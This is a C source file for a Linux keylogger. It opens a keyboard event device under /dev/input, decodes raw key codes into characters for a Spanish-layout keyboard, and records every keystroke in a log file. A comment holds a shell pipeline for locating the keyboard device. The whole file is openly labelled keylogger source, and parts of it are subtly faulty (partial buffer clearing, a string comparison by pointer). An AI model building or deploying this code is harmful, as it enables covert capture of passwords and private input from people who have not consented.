#include <stdlib.h> 
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>


/** GET THE EVENT NUMBER OF THE KEYBOARD **/
// line=`cat -n /proc/bus/input/devices | grep keyboard | tr -s ' ' | cut -d' ' -f2 | head -c 1`
// cat -n /proc/bus/input/devices | tail -n+$line | head -n $(($line+7)) | grep -o event[0-500]


int main(int argc, char** argv){

    if(argc != 3){
        perror("[keylogger] > No keyboard device given or no output file");
        exit(1);
    }


    char KEY_INPUT[512]; // Path to the keyboard file
    sprintf(KEY_INPUT, "/dev/input/%s", argv[1]); // argv[1] = event[0-*]
    const int BUFFER_SIZE = 6;
    int num_read[BUFFER_SIZE];
    int fd_input, fd_output;
    char* OUTPUT_FILE;
    
    if(argv[2] != ""){
        OUTPUT_FILE = argv[2];
    }else{
        OUTPUT_FILE = "KEY.log";
    }

    if((fd_input = open(KEY_INPUT, O_RDONLY, 0)) < 0){ // Open de keyboard file
        perror("[keylogger] > Error opening keyboard file\n");
        exit(1);
    }else{
        printf("[keylogger] > Reading keyboard\n");
    }
    if((fd_output = open(OUTPUT_FILE, O_RDWR | O_TRUNC | O_CREAT, 0640)) < 0){
        perror("[keylogger] > Error opening output file\n");
        exit(1);
    }else{
        printf("[keylogger] > Saving on %s\n\n", OUTPUT_FILE);
        dup2(fd_output, STDOUT_FILENO); // Write on output file instead of standard output
    }

    while(read(fd_input, &num_read, sizeof(int)*BUFFER_SIZE) > 0){ // Read from the keyboard file
        int printed = 0;
        for(int i = 0; i < BUFFER_SIZE && (printed != 1); i++){
            //printf("BUFFER[%d]: %d\n", i, num_read[i]);
            switch (num_read[BUFFER_SIZE-1]){
                case 2:
                    printf("%d\n", 1);
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 3:
                    printf("%d\n", 2);
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 4:
                    printf("%d\n", 3);
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 5:
                    printf("%d\n", 4);
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 6:
                    printf("%d\n", 5);
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 7:
                    printf("%d\n", 6);
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 8:
                    printf("%d\n", 7);
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 9:
                    printf("%d\n", 8);
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 10:
                    printf("%d\n", 9);
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 11:
                    printf("%d\n", 0);
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 12:
                    printf("%s\n", "'");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 13:
                    printf("%s\n", "¡");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 14:
                    printf("%s\n", "backspace");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 15:
                    printf("%s\n", "tab");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 16:
                    printf("%s\n", "q");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 17:
                    printf("%s\n", "w");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 18:
                    printf("%s\n", "e");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 19:
                    printf("%s\n", "r");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 20:
                    printf("%s\n", "t");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 21:
                    printf("%s\n", "y");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 22:
                    printf("%s\n", "u");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 23:
                    printf("%s\n", "i");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 24:
                    printf("%s\n", "o");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 25:
                    printf("%s\n", "p");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 26:
                    printf("%s\n", "`");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 27:
                    printf("%s\n", "+");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 28:
                    printf("%s\n", "enter");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 29:
                    printf("%s\n", "letf_control");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 30:
                    printf("%s\n", "a");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 31:
                    printf("%s\n", "s");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 32:
                    printf("%s\n", "d");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 33:
                    printf("%s\n", "f");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 34:
                    printf("%s\n", "g");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 35:
                    printf("%s\n", "h");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 36:
                    printf("%s\n", "j");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 37:
                    printf("%s\n", "k");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 38:
                    printf("%s\n", "l");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 39:
                    printf("%s\n", "ñ");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 44:
                    printf("%s\n", "z");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 45:
                    printf("%s\n", "x");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 46:
                    printf("%s\n", "c");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 47:
                    printf("%s\n", "v");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 48:
                    printf("%s\n", "b");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 49:
                    printf("%s\n", "n");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 50:
                    printf("%s\n", "m");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 51:
                    printf("%s\n", ",");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 52:
                    printf("%s\n", ".");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 53:
                    printf("%s\n", "-");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                case 54:
                    printf("%s\n", "right_shift");
                    printed = 1;
                    memset(num_read,0,BUFFER_SIZE);
                    break;
                default:
                    //printf("Key not recognized\n");
                    memset(num_read,0,BUFFER_SIZE);
                    break;
            }
        }
        //printf("***********************************");
    }
    close(fd_input); // Close the keyboard file
    close(fd_output);
 }


